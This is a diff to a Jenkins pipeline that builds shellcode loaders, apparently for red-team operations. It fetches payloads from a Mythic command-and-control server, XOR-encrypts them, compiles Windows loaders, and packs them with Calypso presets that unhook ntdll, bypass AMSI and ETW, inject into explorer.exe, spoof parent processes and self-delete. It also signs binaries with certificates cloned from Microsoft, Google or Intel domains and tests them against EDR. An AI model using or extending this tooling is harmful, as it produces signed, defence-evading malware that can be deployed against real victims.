@@ -2,14 +2,22 @@ pipeline {
     agent none
 
     parameters {
-        choice(name: 'LANGUAGE', choices: ['c-mingw', 'c-ollvm', 'go-garble', 'nim', 'csharp'], description: 'Toolchain for compilation')
+        string(name: 'LANGUAGE', defaultValue: '', description: 'Loader directory name under loaders/ (e.g. loader-c-mingw). Auto-detected from job name if empty.')
         choice(name: 'OUTPUT_FORMAT', choices: ['exe', 'dll', 'shellcode'], description: 'Output format')
-        choice(name: 'OBFUSCATION', choices: ['none', 'ollvm-cff', 'ollvm-bcf-cff', 'ollvm-full', 'ollvm-heavy', 'garble-literals', 'string-encrypt'], description: 'Obfuscation profile')
+        string(name: 'OBFUSCATION', defaultValue: 'none', description: 'Obfuscation profile (none, ollvm-cff, ollvm-bcf-cff, ollvm-full, ollvm-heavy, garble-literals, string-encrypt, calypso)')
         string(name: 'SHELLCODE_PATH', defaultValue: '', description: 'Path to shellcode binary (relative to repo)')
         string(name: 'MYTHIC_PAYLOAD_UUID', defaultValue: '', description: 'Mythic payload UUID to fetch shellcode from')
+        string(name: 'SHELLCODE_SOURCE', defaultValue: '', description: 'Daedalus shellcode source ref (mythic:<uuid>)')
+        choice(name: 'CALYPSO_MODE', choices: ['pack', 'standalone'], description: 'Calypso mode: pack wraps the compiled loader in Calypso (loader-in-loader), standalone feeds raw shellcode to Calypso and uses its own loader (single loader)')
+        string(name: 'PACKER_PRESET', defaultValue: '', description: 'Calypso packer preset from build-profiles.yml (e.g. stealth, evasive, evasive-drip, minimal). Resolved to flags at build time. Ignored if PACKER_FLAGS is set.')
+        string(name: 'PACKER_FLAGS', defaultValue: '', description: 'Raw Calypso packer flags (e.g. --unhook ntdll.dll --amsi hwbp --etw hwbp). Overrides PACKER_PRESET if both are set.')
         booleanParam(name: 'LITTERBOX_SCAN', defaultValue: true, description: 'Submit to LitterBox after build')
         choice(name: 'SCAN_TYPE', choices: ['all', 'static', 'dynamic', 'edr'], description: 'LitterBox scan profile')
         booleanParam(name: 'PE_SANITISE', defaultValue: true, description: 'Strip PE metadata post-build')
+        string(name: 'SIGNING_PROFILE', defaultValue: 'none', description: 'Code signing profile: microsoft, google, intel, custom, none')
+        choice(name: 'TARGET_ARCH', choices: ['amd64', 'arm64'], description: 'Target architecture')
+        string(name: 'OPERATOR_ID', defaultValue: '', description: 'Operator callsign for deconfliction tagging')
+        string(name: 'CAMPAIGN_TAG', defaultValue: '', description: 'Campaign identifier for deconfliction tagging')
     }
 
     environment {
@@ -25,162 +33,300 @@ pipeline {
             steps {
                 checkout scm
                 stash includes: '**', name: 'source'
+                script {
+                    def isCalypsoStandalone = (params.OBFUSCATION == 'calypso' && params.CALYPSO_MODE == 'standalone')
+
+                    // Resolve loader name: job name (loader-<name>) or LANGUAGE param
+                    def jobLang = env.JOB_NAME.replaceFirst(/^loader-/, '')
+                    def paramLang = params.LANGUAGE?.trim() ?: ''
+                    def loaderDir = ''
+
+                    if (paramLang) {
+                        // Accept both "c-mingw" and "loader-c-mingw"
+                        loaderDir = paramLang.startsWith('loader-') ? paramLang : "loader-${paramLang}"
+                    } else if (jobLang != env.JOB_NAME) {
+                        loaderDir = "loader-${jobLang}"
+                    } else if (!isCalypsoStandalone) {
+                        error "Cannot determine loader. Set LANGUAGE parameter or name the job loader-<name>."
+                    }
+
+                    if (isCalypsoStandalone) {
+                        // Calypso standalone doesn't need a custom loader
+                        env.LOADER_DIR = loaderDir ?: 'none'
+                        env.EFFECTIVE_LANG = 'calypso'
+                        echo "Calypso standalone mode (no custom loader)"
+                    } else {
+                        // Validate the loader directory exists and has build.sh + loader.yml
+                        def exists = sh(script: "[ -d loaders/${loaderDir} ] && echo yes || echo no", returnStdout: true).trim()
+                        if (exists != 'yes') {
+                            error "Loader directory loaders/${loaderDir} not found. Available: " +
+                                  sh(script: "ls -1 loaders/", returnStdout: true).trim()
+                        }
+                        def hasBuild = sh(script: "[ -f loaders/${loaderDir}/build.sh ] && echo yes || echo no", returnStdout: true).trim()
+                        if (hasBuild != 'yes') {
+                            error "loaders/${loaderDir}/build.sh not found. Each loader must provide a build.sh."
+                        }
+                        def hasManifest = sh(script: "[ -f loaders/${loaderDir}/loader.yml ] && echo yes || echo no", returnStdout: true).trim()
+                        if (hasManifest != 'yes') {
+                            error "loaders/${loaderDir}/loader.yml not found. Each loader must provide a loader.yml."
+                        }
+
+                        env.LOADER_DIR = loaderDir
+                        // Strip "loader-" prefix for backwards compat (Daedalus, archive paths)
+                        env.EFFECTIVE_LANG = loaderDir.replaceFirst(/^loader-/, '')
+                        echo "Loader: ${loaderDir} (lang: ${env.EFFECTIVE_LANG})"
+                    }
+                }
             }
         }
 
         stage('Fetch Mythic Payload') {
             when {
                 beforeAgent true
-                expression { params.MYTHIC_PAYLOAD_UUID?.trim() }
+                expression {
+                    def src = params.SHELLCODE_SOURCE?.trim() ?: ''
+                    def uuid = params.MYTHIC_PAYLOAD_UUID?.trim() ?: ''
+                    return src.startsWith('mythic:') || uuid
+                }
             }
             agent { label 'linux-generic' }
             steps {
-                sh """
+                script {
+                    def shellcodeSource = params.SHELLCODE_SOURCE?.trim() ?: ''
+                    def directUuid = params.MYTHIC_PAYLOAD_UUID?.trim() ?: ''
+                    if (shellcodeSource.startsWith('mythic:')) {
+                        env.RESOLVED_PAYLOAD_UUID = shellcodeSource.replaceFirst(/^mythic:/, '')
+                    } else {
+                        env.RESOLVED_PAYLOAD_UUID = directUuid
+                    }
+                }
+                sh """#!/bin/bash
+                    set -euo pipefail
                     mkdir -p shellcode
-                    curl -k -H "apitoken: \${MYTHIC_API_TOKEN}" \\
-                        "\${MYTHIC_URL}/api/v1.4/payloads/download/${params.MYTHIC_PAYLOAD_UUID}" \\
-                        -o shellcode/payload.bin
+
+                    echo "[*] Fetching payload ${env.RESOLVED_PAYLOAD_UUID} from Mythic..."
+                    HTTP_CODE=\$(curl -sk -w '%{http_code}' \\
+                        "\${MYTHIC_URL}/direct/download/${env.RESOLVED_PAYLOAD_UUID}" \\
+                        -o shellcode/payload.bin)
+
+                    if [ "\$HTTP_CODE" -ne 200 ] || [ ! -s shellcode/payload.bin ]; then
+                        echo "[!] Direct download failed (HTTP \$HTTP_CODE), trying API endpoint..."
+                        HTTP_CODE=\$(curl -sk -w '%{http_code}' \\
+                            -H "apitoken: \${MYTHIC_API_TOKEN}" \\
+                            "\${MYTHIC_URL}/api/v1.4/payloads/download/${env.RESOLVED_PAYLOAD_UUID}" \\
+                            -o shellcode/payload.bin)
+                        if [ "\$HTTP_CODE" -ne 200 ] || [ ! -s shellcode/payload.bin ]; then
+                            echo "[-] ERROR: Both download methods failed (HTTP \$HTTP_CODE)"
+                            exit 1
+                        fi
+                        echo "[+] Downloaded via API endpoint"
+                    else
+                        echo "[+] Downloaded via direct link"
+                    fi
+
+                    SC_SIZE=\$(stat -c%s shellcode/payload.bin)
+                    echo "[+] Payload size: \$SC_SIZE bytes"
+                    if [ "\$SC_SIZE" -lt 16 ]; then
+                        echo "[!] WARNING: Payload is only \$SC_SIZE bytes - verify the UUID is correct"
+                    fi
                 """
                 stash includes: 'shellcode/**', name: 'shellcode'
             }
         }
 
-        stage('Build - C') {
+        stage('Encrypt Shellcode') {
             when {
                 beforeAgent true
-                expression { params.LANGUAGE in ['c-mingw', 'c-ollvm'] }
+                expression {
+                    // Skip shellcrypt when Calypso standalone handles the shellcode directly
+                    !(params.OBFUSCATION == 'calypso' && params.CALYPSO_MODE == 'standalone')
+                }
             }
             agent {
                 docker {
                     image 'maas-builder-c'
                     label 'linux-c'
-                    args '-v /payloads:/payloads'
                 }
             }
             steps {
                 unstash 'source'
-                script { if (params.MYTHIC_PAYLOAD_UUID?.trim()) { unstash 'shellcode' } }
-                sh """
-                    mkdir -p shellcode
-                    [ -f shellcode/payload.bin ] || printf '\\xcc' > shellcode/payload.bin
-                """
                 script {
-                    def ext = params.OUTPUT_FORMAT == 'dll' ? 'dll' : 'exe'
-                    def sharedFlag = params.OUTPUT_FORMAT == 'dll' ? '-shared' : ''
+                    def hasShellcode = params.SHELLCODE_SOURCE?.trim() || params.MYTHIC_PAYLOAD_UUID?.trim()
+                    if (hasShellcode) { unstash 'shellcode' }
+                }
+                script {
+                    def scInput = params.SHELLCODE_PATH?.trim() ?: 'shellcode/payload.bin'
+                    sh """#!/bin/bash
+                        set -euo pipefail
+                        mkdir -p shellcode
 
-                    // collect all .c sources under src/
-                    def sources = sh(script: "find src -name '*.c' | sort | tr '\\n' ' '", returnStdout: true).trim()
+                        SC_INPUT="${scInput}"
+                        if [ ! -f "\$SC_INPUT" ]; then
+                            echo "[-] ERROR: Shellcode file '\$SC_INPUT' not found."
+                            echo "    Provide shellcode via MYTHIC_PAYLOAD_UUID / SHELLCODE_SOURCE or place it at SHELLCODE_PATH."
+                            exit 1
+                        fi
 
-                    // compile resource if present
-                    if (fileExists('src/resource.rc')) {
-                        sh "x86_64-w64-mingw32-windres src/resource.rc -o resource.o"
+                        SC_SIZE=\$(stat -c%s "\$SC_INPUT")
+                        echo "[+] Using shellcode: \$SC_INPUT (\$SC_SIZE bytes)"
+
+                        XOR_KEY=\$(python3 -c "import os; print(os.urandom(32).hex())")
+
+                        python3 \${SHELLCRYPT} -i "\$SC_INPUT" -e xor -k "\$XOR_KEY" -f c -a shellcode -o shellcode/shellcode.h
+                        python3 \${SHELLCRYPT} -i "\$SC_INPUT" -e xor -k "\$XOR_KEY" -f go -a shellcode -o shellcode/shellcode.go
+                        sed -i '1i\\\\package main' shellcode/shellcode.go
+                        python3 \${SHELLCRYPT} -i "\$SC_INPUT" -e xor -k "\$XOR_KEY" -f rust -a shellcode -o shellcode/shellcode.rs
+                        sed -i 's/^let /pub static /' shellcode/shellcode.rs
+                        expand -t4 shellcode/shellcode.rs > shellcode/shellcode.rs.tmp && mv shellcode/shellcode.rs.tmp shellcode/shellcode.rs
+                        python3 \${SHELLCRYPT} -i "\$SC_INPUT" -e xor -k "\$XOR_KEY" -f csharp -a shellcode -o shellcode/Shellcode.cs
+                        sed -i '1i\\\\static class SC {' shellcode/Shellcode.cs
+                        echo "}" >> shellcode/Shellcode.cs
+                        sed -i 's/^byte\\[\\]/    internal static byte[]/' shellcode/Shellcode.cs
+
+                        echo "[+] Shellcode encrypted with Shellcrypt (key: 32 bytes)"
+                    """
+                }
+                stash includes: 'shellcode/**', name: 'encrypted-shellcode'
+            }
+        }
+
+        stage('Build') {
+            when {
+                beforeAgent true
+                expression {
+                    // Skip custom loader build when Calypso standalone uses its own loader
+                    !(params.OBFUSCATION == 'calypso' && params.CALYPSO_MODE == 'standalone')
+                }
+            }
+            agent {
+                docker {
+                    image "${-> readYaml(file: "loaders/${env.LOADER_DIR}/loader.yml").docker_image}"
+                    label "${-> readYaml(file: "loaders/${env.LOADER_DIR}/loader.yml").agent_label}"
+                    args "${-> readYaml(file: "loaders/${env.LOADER_DIR}/loader.yml").volumes?.collect { '-v ' + it }?.join(' ') ?: ''}"
+                }
+            }
+            steps {
+                unstash 'source'
+                unstash 'encrypted-shellcode'
+                script {
+                    def manifest = readYaml file: "loaders/${env.LOADER_DIR}/loader.yml"
+                    def scDest = manifest.shellcode_dest
+                    def scFormat = manifest.shellcode_format
+
+                    // Copy the right shellcode format into the loader source tree
+                    def scSrcMap = [
+                        'c':      'shellcode/shellcode.h',
+                        'go':     'shellcode/shellcode.go',
+                        'rust':   'shellcode/shellcode.rs',
+                        'csharp': 'shellcode/Shellcode.cs',
+                    ]
+                    def scSrc = scSrcMap[scFormat]
+                    if (!scSrc) {
+                        error "Unknown shellcode_format '${scFormat}' in loader.yml"
                     }
-                    def resObj = fileExists('src/resource.rc') ? 'resource.o' : ''
+                    sh "cp '${scSrc}' 'loaders/${env.LOADER_DIR}/${scDest}'"
 
-                    if (params.LANGUAGE == 'c-ollvm') {
-                        def ollvmFlags = ''
-                        switch (params.OBFUSCATION) {
-                            case 'ollvm-cff':
-                                ollvmFlags = '-mllvm -fla'; break
-                            case 'ollvm-bcf-cff':
-                                ollvmFlags = '-mllvm -fla -mllvm -bcf'; break
-                            case 'ollvm-full':
-                                ollvmFlags = '-mllvm -fla -mllvm -bcf -mllvm -sub'; break
-                            case 'ollvm-heavy':
-                                ollvmFlags = '-mllvm -fla -mllvm -split -mllvm -bcf -mllvm -bcf_prob=100 -mllvm -bcf_loop=3 -mllvm -sub -mllvm -sub_loop=5'; break
-                            default:
-                                ollvmFlags = ''; break
-                        }
-                        sh """
-                            clang --target=x86_64-w64-mingw32 ${ollvmFlags} \\
-                                -c ${sources} -Isrc -O1
-                            x86_64-w64-mingw32-gcc -o loader.${ext} \\
-                                *.o ${resObj} ${sharedFlag} \\
-                                -lntdll -lkernel32 -s
-                        """
-                    } else {
-                        sh """
-                            x86_64-w64-mingw32-gcc -o loader.${ext} \\
-                                ${sources} ${resObj} \\
-                                -Isrc ${sharedFlag} \\
-                                -lntdll -lkernel32 -mwindows -s -O2
+                    // Run the loader's build script
+                    def outputFormat = params.OUTPUT_FORMAT ?: 'exe'
+                    def targetArch = params.TARGET_ARCH ?: 'amd64'
+                    def obfuscation = params.OBFUSCATION ?: 'none'
+
+                    dir("loaders/${env.LOADER_DIR}") {
+                        sh """#!/bin/bash
+                            set -euo pipefail
+                            chmod +x build.sh
+                            ./build.sh '${outputFormat}' '${targetArch}' '${obfuscation}'
                         """
                     }
+
+                    // Move artifact to workspace root for downstream stages
+                    sh "cp loaders/${env.LOADER_DIR}/loader.* ."
                 }
                 stash includes: "loader.*", name: 'artifact'
             }
         }
 
-        stage('Build - Go') {
+        stage('Pack - Calypso') {
             when {
                 beforeAgent true
-                expression { params.LANGUAGE == 'go-garble' }
+                expression { params.OBFUSCATION == 'calypso' }
             }
             agent {
                 docker {
-                    image 'maas-builder-go'
-                    label 'linux-go'
+                    image 'maas-builder-calypso'
+                    label 'linux-generic'
                     args '-v /payloads:/payloads'
                 }
             }
             steps {
                 unstash 'source'
-                script { if (params.MYTHIC_PAYLOAD_UUID?.trim()) { unstash 'shellcode' } }
-                sh """
-                    GOOS=windows GOARCH=amd64 \\
-                    garble -literals -tiny build \\
-                        -o loader.exe -ldflags="-s -w" \\
-                        ./...
-                """
-                stash includes: 'loader.exe', name: 'artifact'
-            }
-        }
+                script {
+                    def calypsoMode = params.CALYPSO_MODE ?: 'pack'
+                    def calypsoFlags = params.PACKER_FLAGS?.trim() ?: ''
 
-        stage('Build - Nim') {
-            when {
-                beforeAgent true
-                expression { params.LANGUAGE == 'nim' }
-            }
-            agent {
-                docker {
-                    image 'maas-builder-nim'
-                    label 'linux-nim'
-                    args '-v /payloads:/payloads'
+                    if (!calypsoFlags && params.PACKER_PRESET?.trim()) {
+                        def presets = [
+                            'none'              : '',
+                            'fast'              : '--unhook ntdll.dll --inject local --execute thread --syscall indirect --cipher aes-cbc',
+                            'stealth'           : '--unhook ntdll.dll --inject local --execute thread --syscall indirect --cipher aes-cbc --sleep 10 --amsi hwbp --etw hwbp',
+                            'stealth-obfuscated': '--unhook ntdll.dll --inject local --execute thread --syscall indirect --cipher aes-cbc --sleep 10 --amsi hwbp --etw hwbp --obfuscate --entropy-reduce',
+                            'evasive'           : '--unhook ntdll.dll --inject remote --execute riscvm --process explorer.exe --ppid explorer.exe --syscall indirect --cipher aes-cbc --compress zlib --sleep 60 --amsi hwbp,context-corrupt --etw hwbp,complus --sandbox memory --block-dlls --obfuscate --entropy-reduce --self-delete --hide',
+                            'evasive-drip'      : '--unhook ntdll.dll --execute riscvm --ppid explorer.exe --syscall indirect --cipher rc4 --compress rle --encode uuid --sleep 60 --amsi context-corrupt --etw complus --sandbox memory,diskspace --module-stomp --drip --obfuscate --entropy-reduce --self-delete --hide',
+                            'minimal'           : '--no-antidebug --amsi none --etw none --cipher xor --inject local --execute direct',
+                        ]
+                        def presetName = params.PACKER_PRESET.trim()
+                        if (presets.containsKey(presetName)) {
+                            calypsoFlags = presets[presetName]
+                            echo "[*] Resolved packer preset '${presetName}' → ${calypsoFlags ?: '(no flags)'}"
+                        } else {
+                            error "Unknown packer preset '${presetName}'. Available: ${presets.keySet().join(', ')}"
+                        }
+                    }
+
+                    if (calypsoMode == 'standalone') {
+                        // Standalone: Calypso takes raw shellcode, uses its own loader
+                        def hasShellcode = params.SHELLCODE_SOURCE?.trim() || params.MYTHIC_PAYLOAD_UUID?.trim()
+                        if (hasShellcode) { unstash 'shellcode' }
+
+                        def scInput = params.SHELLCODE_PATH?.trim() ?: 'shellcode/payload.bin'
+
+                        sh """#!/bin/bash
+                            set -euo pipefail
+                            if [ ! -f '${scInput}' ]; then
+                                echo '[-] ERROR: Shellcode file ${scInput} not found for Calypso standalone mode.'
+                                exit 1
+                            fi
+                            SC_SIZE=\$(stat -c%s '${scInput}')
+                            echo "[*] Calypso standalone: processing raw shellcode (\$SC_SIZE bytes)"
+                            ABS_IN="\$(pwd)/${scInput}"
+                            ABS_OUT="\$(pwd)/loader.exe"
+                            /opt/calypso/build/calypso --file "\$ABS_IN" --type shellcode \
+                                --output "\$ABS_OUT" --hide \
+                                ${calypsoFlags}
+                            echo "[+] Calypso standalone output: loader.exe (\$(stat -c%s loader.exe) bytes)"
+                        """
+                    } else {
+                        // Pack mode: wrap the compiled custom loader PE
+                        unstash 'artifact'
+                        def packMode = (env.EFFECTIVE_LANG == 'csharp') ? '--type csharp' : '--peinject'
+
+                        sh """#!/bin/bash
+                            set -euo pipefail
+                            for f in loader.*; do
+                                [ -f "\$f" ] || continue
+                                EXT="\${f##*.}"
+                                ABS_IN="\$(pwd)/\$f"
+                                ABS_OUT="\$(pwd)/\${f%.\$EXT}-packed.\$EXT"
+                                echo "[*] Packing \$f with Calypso (${packMode}, lang: ${env.EFFECTIVE_LANG})"
+                                /opt/calypso/build/calypso --file "\$ABS_IN" ${packMode} \
+                                    --output "\$ABS_OUT" \
+                                    ${calypsoFlags}
+                                mv "\$ABS_OUT" "\$f"
+                            done
+                        """
+                    }
                 }
-            }
-            steps {
-                unstash 'source'
-                script { if (params.MYTHIC_PAYLOAD_UUID?.trim()) { unstash 'shellcode' } }
-                sh """
-                    NIM_MAIN=\$(find src -maxdepth 1 -name '*.nim' | head -1)
-                    nim c -d:mingw -d:release -d:strip \\
-                        --opt:size --app:gui \\
-                        -o:loader.exe "\$NIM_MAIN"
-                """
-                stash includes: 'loader.exe', name: 'artifact'
-            }
-        }
-
-        stage('Build - C#') {
-            when {
-                beforeAgent true
-                expression { params.LANGUAGE == 'csharp' }
-            }
-            agent { label 'windows-dotnet' }
-            steps {
-                unstash 'source'
-                script { if (params.MYTHIC_PAYLOAD_UUID?.trim()) { unstash 'shellcode' } }
-                bat """
-                    for /R src %%f in (*.csproj) do (
-                        dotnet publish "%%f" ^
-                            -c Release -r win-x64 ^
-                            --self-contained true ^
-                            -p:PublishSingleFile=true ^
-                            -p:PublishTrimmed=true ^
-                            -o .
-                    )
-                """
-                stash includes: '*.exe', name: 'artifact'
+                stash includes: "loader.*", name: 'artifact'
             }
         }
 
@@ -191,9 +337,10 @@ pipeline {
             }
             agent { label 'linux-generic' }
             steps {
+                unstash 'source'
                 unstash 'artifact'
                 sh """
-                    python3 tools/pe-sanitise.py loader.* \\
+                    python3 pipeline/tools/pe-sanitise.py loader.* \\
                         --strip-rich --randomise-timestamp \\
                         --strip-debug --strip-version-info
                 """
@@ -201,14 +348,128 @@ pipeline {
             }
         }
 
-        stage('Checksum') {
-            agent { label 'linux-generic' }
+        stage('Sign - Limelighter') {
+            when {
+                beforeAgent true
+                expression { params.SIGNING_PROFILE != 'none' && params.SIGNING_PROFILE?.trim() }
+            }
+            agent {
+                docker {
+                    image 'maas-builder-go'
+                    label 'linux-go'
+                    args '-v /payloads:/payloads'
+                }
+            }
             steps {
                 script {
                     try { unstash 'sanitised' } catch (e) { unstash 'artifact' }
                 }
+                unstash 'source'
+                script {
+                    def profiles = readYaml file: 'pipeline/tools/signing-profiles.yml'
+                    def profileName = params.SIGNING_PROFILE
+                    def profile = profiles.profiles[profileName]
+                    if (!profile || !profile.domain) {
+                        error "Unknown or invalid signing profile: ${profileName}"
+                    }
+                    def domain = profile.domain
+                    def mode = profile.mode ?: 'clone'
+
+                    if (mode == 'pfx') {
+                        def pfxPath = profile.pfx_path ?: error("PFX profile '${profileName}' missing pfx_path")
+                        def password = profile.password ?: ''
+                        sh """
+                            for f in loader.*; do
+                                [ -f "\$f" ] || continue
+                                echo "[*] Signing \$f with real certificate (profile: ${profileName})"
+                                Limelighter -I "\$f" -O "\${f}.signed" -Real "${pfxPath}" -Password "${password}"
+                                mv "\${f}.signed" "\$f"
+                            done
+                        """
+                    } else if (mode == 'self-signed') {
+                        def password = profile.password ?: 'changeme'
+                        sh """
+                            for f in loader.*; do
+                                [ -f "\$f" ] || continue
+                                echo "[*] Signing \$f with self-signed cert (profile: ${profileName}, domain: ${domain})"
+                                Limelighter -I "\$f" -O "\${f}.signed" -Domain "${domain}" -Password "${password}"
+                                mv "\${f}.signed" "\$f"
+                            done
+                        """
+                    } else {
+                        sh """
+                            for f in loader.*; do
+                                [ -f "\$f" ] || continue
+                                echo "[*] Signing \$f with cloned cert (profile: ${profileName}, domain: ${domain})"
+                                Limelighter -I "\$f" -O "\${f}.signed" -Domain "${domain}"
+                                mv "\${f}.signed" "\$f"
+                            done
+                        """
+                    }
+                }
+                stash includes: "loader.*", name: 'signed'
+            }
+        }
+
+        stage('Checksum') {
+            agent { label 'linux-generic' }
+            steps {
+                script {
+                    try { unstash 'signed' } catch (e) {
+                        try { unstash 'sanitised' } catch (e2) { unstash 'artifact' }
+                    }
+                }
                 sh 'sha256sum loader.* > checksums.sha256'
                 stash includes: 'loader.*,checksums.sha256', name: 'final'
+            }
+        }
+
+        stage('Deconfliction Tag') {
+            when {
+                beforeAgent true
+                expression { params.OPERATOR_ID?.trim() && params.CAMPAIGN_TAG?.trim() }
+            }
+            agent { label 'linux-generic' }
+            steps {
+                unstash 'final'
+                unstash 'source'
+                sh """#!/bin/bash
+                    set -euo pipefail
+                    for f in loader.*; do
+                        [ -f "\$f" ] || continue
+                        echo "[*] Tagging \$f (operator: ${params.OPERATOR_ID}, campaign: ${params.CAMPAIGN_TAG})"
+                        python3 pipeline/tools/deconflict-tag.py tag \\
+                            --input "\$f" \\
+                            --operator "${params.OPERATOR_ID}" \\
+                            --campaign "${params.CAMPAIGN_TAG}"
+                    done
+                """
+                sh 'sha256sum loader.* > checksums.sha256'
+                stash includes: 'loader.*,checksums.sha256', name: 'final'
+            }
+        }
+
+        stage('Version Manifest') {
+            agent { label 'linux-generic' }
+            steps {
+                unstash 'final'
+                unstash 'source'
+                script {
+                    def scFile = params.SHELLCODE_PATH ?: 'shellcode/payload.bin'
+                    sh """#!/bin/bash
+                        set -euo pipefail
+                        python3 pipeline/tools/payload-version.py \
+                            --source-dir . \
+                            --shellcode "${scFile}" \
+                            --obfuscation "${params.OBFUSCATION}" \
+                            --flags "" \
+                            --profile "${env.EFFECTIVE_LANG}" \
+                            --pe-file \$(ls loader.* | head -1) \
+                            --output manifest.json
+                    """
+                }
+                stash includes: 'manifest.json', name: 'manifest'
+                archiveArtifacts artifacts: 'manifest.json'
             }
         }
 
@@ -272,6 +533,8 @@ pipeline {
                             PROFILES=\$(curl -sf "\${LB}/api/edr/profiles" | jq -r '.profiles[].name' 2>/dev/null || true)
                             for p in \$PROFILES; do
                                 trigger_scan "edr/\${p}"
+                                echo "[*] Waiting 60s for EDR agent to execute and collect alerts..."
+                                sleep 60
                                 poll_scan "\${LB}/api/results/edr/\${p}/\${MD5}"
                             done
                             ;;
@@ -283,6 +546,8 @@ pipeline {
                             PROFILES=\$(curl -sf "\${LB}/api/edr/profiles" | jq -r '.profiles[].name' 2>/dev/null || true)
                             for p in \$PROFILES; do
                                 trigger_scan "edr/\${p}"
+                                echo "[*] Waiting 60s for EDR agent to execute and collect alerts..."
+                                sleep 60
                                 poll_scan "\${LB}/api/results/edr/\${p}/\${MD5}"
                             done
                             ;;
@@ -309,11 +574,17 @@ pipeline {
             agent { label 'linux-generic' }
             steps {
                 unstash 'final'
+                script {
+                    try { unstash 'manifest' } catch (e) {
+                        echo "No manifest to archive"
+                    }
+                }
                 sh """
                     mkdir -p "\${ARTIFACT_DIR}"
                     cp loader.* checksums.sha256 "\${ARTIFACT_DIR}/"
+                    [ -f manifest.json ] && cp manifest.json "\${ARTIFACT_DIR}/"
                 """
-                archiveArtifacts artifacts: 'loader.*,checksums.sha256'
+                archiveArtifacts artifacts: 'loader.*,checksums.sha256,manifest.json', allowEmptyArchive: true
             }
         }
     }
@@ -322,6 +593,34 @@ pipeline {
         always {
             node('linux-generic') {
                 deleteDir()
+            }
+        }
+        success {
+            node('linux-generic') {
+                unstash 'final'
+                script {
+                    try { unstash 'manifest' } catch (e) { /* no manifest */ }
+                }
+                sh """#!/bin/bash
+                    set -euo pipefail
+                    if [ -f manifest.json ]; then
+                        VERSION=\$(python3 -c "import sys,json; print(json.load(sys.stdin)['version'])" < manifest.json)
+                    else
+                        VERSION="\$(date +%s)"
+                    fi
+                    LOADER="${env.EFFECTIVE_LANG}"
+                    ARCHIVE="/payloads/archive/\${LOADER}/\${VERSION}"
+                    mkdir -p "\$ARCHIVE"
+                    cp loader.* "\$ARCHIVE/" 2>/dev/null || true
+                    [ -f checksums.sha256 ] && cp checksums.sha256 "\$ARCHIVE/"
+                    [ -f manifest.json ] && cp manifest.json "\$ARCHIVE/"
+                    echo "[+] Archived \${LOADER} version \${VERSION}"
+
+                    cd "/payloads/archive/\${LOADER}/"
+                    ls -1t | tail -n +11 | xargs -r rm -rf
+                    REMAINING=\$(ls -1 | wc -l)
+                    echo "[+] Archive contains \${REMAINING} version(s)"
+                """
             }
         }
     }
